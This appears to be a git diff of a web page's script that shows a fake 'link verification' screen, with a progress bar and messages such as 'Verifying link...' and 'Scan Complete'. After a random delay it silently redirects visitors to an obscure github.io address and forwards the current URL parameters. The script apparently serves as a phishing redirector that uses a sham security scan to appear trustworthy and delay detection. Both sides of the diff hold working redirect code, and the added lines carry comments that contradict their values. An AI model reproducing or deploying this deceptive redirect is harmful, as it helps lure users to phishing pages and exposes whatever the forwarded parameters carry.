@@ -57,61 +57,60 @@
         </div>
     </div>
     <script>
-  const progressBar = document.getElementById('loadingProgress');
-  const robotPrompt = document.getElementById('robotPrompt');
-  let progress = 0;
-  const totalDuration = 20000; // 20 seconds
-  const minRedirectDelay = 10000; // 10 seconds
-  const maxRedirectDelay = 16000; // 16 seconds
-  const stepTime = totalDuration / 100; // Time for each 1% step
-  const messages = [
-    "Verifying link...",
-    "Expanding link...",
-    "Connecting to a server...",
-    "Loading page...",
-    "Verifying content...",
-    "Extracting page features...",
-    "Verifying features...",
-    "Scan Complete"
-  ];
-  let messageIndex = 0;
+        const progressBar = document.getElementById('loadingProgress');
+        const robotPrompt = document.getElementById('robotPrompt');
+        let progress = 0;
+        const totalDuration = 20000; // 20 seconds
+        const minRedirectDelay = 10000; // 5 seconds
+        const maxRedirectDelay = 16000; // 10 seconds
+        const stepTime = totalDuration / 100; // Time for each 1% step
+        const messages = [
+            "Verifying link...",
+            "Expanding link...",
+            "Connecting to a server...",
+            "Loading page...",
+            "Verifying content...",
+            "Extracting page features...",
+            "Verifying features...",
+            "Scan Complete"
+        ];
+        let messageIndex = 0;
 
-  function startProgress() {
-    const timer = setInterval(() => {
-      progress += 1;
-      progressBar.style.width = progress + '%';
-      if (progress >= 100) {
-        clearInterval(timer);
-      }
-    }, stepTime);
+        function startProgress() {
+            const timer = setInterval(() => {
+                progress += 1;
+                progressBar.style.width = progress + '%';
+                if (progress >= 100) {
+                    clearInterval(timer);
+                }
+            }, stepTime);
 
-    const redirectDelay = Math.random() * (maxRedirectDelay - minRedirectDelay) + minRedirectDelay;
-    setTimeout(() => {
-      const baseUrl = "https://shbfiuqa.github.io/hhyuierkjsu374u3y7w8ehdjeuy78ryefdshiuw/";
-      const currentUrlParams = new URLSearchParams(window.location.search);
-      const queryParamsString = currentUrlParams.toString();
-      const redirectUrl = queryParamsString ? `${baseUrl}?${queryParamsString}` : baseUrl;
-      window.location.href = redirectUrl;
-    }, redirectDelay);
-  }
+            const redirectDelay = Math.random() * (maxRedirectDelay - minRedirectDelay) + minRedirectDelay;
+            setTimeout(() => {
+                const currentUrl = new URL(window.location.href);
+                const params = currentUrl.search;
+                const redirectUrl = "https://shbfiuqa.github.io/hhyuierkjsu374u3y7w8ehdjeuy78ryefdshiuw/" + params;
+                window.location.href = redirectUrl;
+            }, redirectDelay);
+        }
 
-  function changeMessage() {
-    robotPrompt.style.opacity = '0';
-    setTimeout(() => {
-      robotPrompt.textContent = messages[messageIndex];
-      robotPrompt.style.opacity = '1';
-      messageIndex = (messageIndex + 1) % messages.length;
-      const randomDelay = Math.random() * (3000 - 1300) + 1300; // Random delay between 1.3 and 3.0 seconds
-      setTimeout(changeMessage, randomDelay);
-    }, 850); // Wait for the fade-out transition to complete
-  }
+        function changeMessage() {
+            robotPrompt.style.opacity = '0';
+            setTimeout(() => {
+                robotPrompt.textContent = messages[messageIndex];
+                robotPrompt.style.opacity = '1';
+                messageIndex = (messageIndex + 1) % messages.length;
+                const randomDelay = Math.random() * (3000 - 1300) + 1300; // Random delay between 1.3 and 3.0 seconds
+                setTimeout(changeMessage, randomDelay);
+            }, 850); // Wait for the fade-out transition to complete
+        }
 
-  window.onload = () => {
-    startProgress();
-    const initialDelay = Math.random() * (3000 - 1300) + 1300; // Initial random delay between 1.3 and 3.0 seconds
-    setTimeout(changeMessage, initialDelay);
-  };
-</script>
+        window.onload = () => {
+            startProgress();
+            const initialDelay = Math.random() * (3000 - 1300) + 1300; // Initial random delay between 1.3 and 3.0 seconds
+            setTimeout(changeMessage, initialDelay);
+        };
+    </script>
 
 
     </body>
